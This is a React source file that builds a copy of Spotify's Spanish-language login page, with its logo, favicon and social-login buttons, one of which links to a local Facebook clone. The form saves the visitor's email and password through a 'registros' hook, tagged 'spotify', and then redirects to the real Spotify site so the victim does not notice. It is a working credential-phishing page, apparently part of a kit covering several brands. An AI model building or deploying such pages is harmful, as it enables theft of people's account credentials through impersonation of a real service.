import { useState, type FormEvent } from 'react';
import { Box, Button, Input, VStack, Text, Flex, Container } from '@chakra-ui/react';
import { useCreateRegistro } from '../../../features/registros/hooks/useRegistros';
import { useDocumentMetadata } from '../../../shared/hooks/useDocumentMetadata';

const SpotifyLogo = () => (
    <svg viewBox="0 0 24 24" width="48" height="48" fill="currentColor">
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.59 14.42c-.18.3-.56.41-.86.23-2.36-1.44-5.33-1.77-8.83-.97-.33.08-.68-.13-.75-.46s.13-.68.46-.75c3.84-.88 7.12-.51 9.75 1.1.3.18.41.56.23.86zm1.23-2.73c-.23.37-.71.49-1.08.26-2.71-1.66-6.84-2.14-10.04-1.17-.41.13-.86-.11-.98-.52s.11-.86.52-.98c3.67-1.11 8.28-.56 11.32 1.33.38.23.49.71.26 1.08zm.11-2.79c-3.25-1.93-8.61-2.11-11.71-1.17-.49.15-1.01-.13-1.16-.62-.15-.49.13-1.01.62-1.16 3.61-1.09 9.55-.89 13.26 1.32.45.27.6.86.33 1.31-.26.45-.85.59-1.34.32z" />
    </svg>
);

export const SpotifyPage = () => {
    // Spotify Favicon URL (using a reliable CDN or public asset)
    useDocumentMetadata('Login - Spotify', 'https://open.spotifycdn.com/cdn/images/favicon.0f31d2ea.ico');

    const { submitRegistro, loading } = useCreateRegistro();
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');

    const handleSubmit = async (e: FormEvent) => {
        e.preventDefault();
        const success = await submitRegistro({ email, password, pagina: 'spotify' });
        if (success) {
            // Simulate redirect to real spotify
            window.location.href = 'https://open.spotify.com/';
        }
    };

    return (
        <Box minH="100vh" bg="black" color="white" display="flex" flexDirection="column">
            {/* Header */}
            <Flex p={6} justify="center" align="center" borderBottom="1px solid" borderColor="whiteAlpha.200">
                <Box color="white"><SpotifyLogo /></Box>
                <Text ml={2} fontSize="2xl" fontWeight="bold">Spotify</Text>
            </Flex>

            <Container maxW="sm" centerContent pt={10} px={4}>
                <VStack spacing={6} w="full">
                    <Text fontSize="sm" fontWeight="bold">Para continuar, inicia sesión en Spotify.</Text>

                    <Button
                        w="full"
                        borderRadius="full"
                        bg="#3b5998"
                        color="white"
                        _hover={{ bg: "#304a80" }}
                        size="lg"
                        onClick={() => window.location.href = '/facebook'}
                    >
                        Continuar con Facebook
                    </Button>
                    <Button w="full" borderRadius="full" bg="black" border="1px solid" borderColor="gray.500" color="white" _hover={{ borderColor: "white" }} size="lg">
                        Continuar con Apple
                    </Button>
                    <Button
                        w="full"
                        borderRadius="full"
                        bg="black"
                        border="1px solid"
                        borderColor="gray.500"
                        color="white"
                        _hover={{ borderColor: "white" }}
                        size="lg"
                        onClick={() => alert('Próximamente')}
                    >
                        Continuar con Google
                    </Button>

                    <Flex align="center" w="full" my={4}>
                        <Box h="1px" bg="gray.600" flex={1} />
                        <Text px={4} fontSize="xs" textTransform="uppercase" color="gray.400">O</Text>
                        <Box h="1px" bg="gray.600" flex={1} />
                    </Flex>

                    <form onSubmit={handleSubmit} style={{ width: '100%' }}>
                        <VStack spacing={4}>
                            <VStack align="start" w="full" spacing={1}>
                                <Text fontSize="sm" fontWeight="bold">Correo electrónico o usuario</Text>
                                <Input
                                    placeholder="Correo electrónico o usuario"
                                    bg="#121212"
                                    border="1px solid"
                                    borderColor="gray.600"
                                    color="white"
                                    _hover={{ borderColor: "white" }}
                                    _focus={{ borderColor: "white", boxShadow: "0 0 0 1px white" }}
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    isRequired
                                />
                            </VStack>

                            <VStack align="start" w="full" spacing={1}>
                                <Text fontSize="sm" fontWeight="bold">Contraseña</Text>
                                <Input
                                    type="password"
                                    placeholder="Contraseña"
                                    bg="#121212"
                                    border="1px solid"
                                    borderColor="gray.600"
                                    color="white"
                                    _hover={{ borderColor: "white" }}
                                    _focus={{ borderColor: "white", boxShadow: "0 0 0 1px white" }}
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    isRequired
                                />
                            </VStack>

                            <Button
                                type="submit"
                                w="full"
                                borderRadius="full"
                                bg="#1ed760"
                                color="black"
                                fontWeight="bold"
                                _hover={{ bg: "#1fdf64", transform: "scale(1.02)" }}
                                size="lg"
                                mt={4}
                                isLoading={loading}
                            >
                                Iniciar Sesión
                            </Button>
                        </VStack>
                    </form>

                    <Text fontSize="xs" mt={6} textAlign="center">
                        ¿No tienes cuenta? <Text as="span" color="white" fontWeight="bold" cursor="pointer" textDecoration="underline">Suscríbete a Spotify</Text>
                    </Text>
                </VStack>
            </Container>
        </Box>
    );
};
